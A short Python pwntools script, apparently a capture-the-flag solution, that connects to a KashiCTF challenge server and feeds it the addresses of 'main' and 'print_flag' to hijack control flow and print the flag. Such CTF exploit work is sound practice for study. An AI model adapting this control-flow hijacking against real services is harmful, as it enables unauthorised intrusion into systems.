from pwn import *

print_flag = 0x004011ba
main = 0x0040125e

p = remote("kashictf.iitbhucybersec.in", 54514)

p.send(hex(main)[2:].encode()+b"\n")
p.send(hex(main)[2:].encode()+b"\n")
p.send(hex(main)[2:].encode()+b"\n")
p.send(hex(print_flag)[2:].encode()+b"\n")

p.recvuntil(b"flag is : ")
p.interactive()
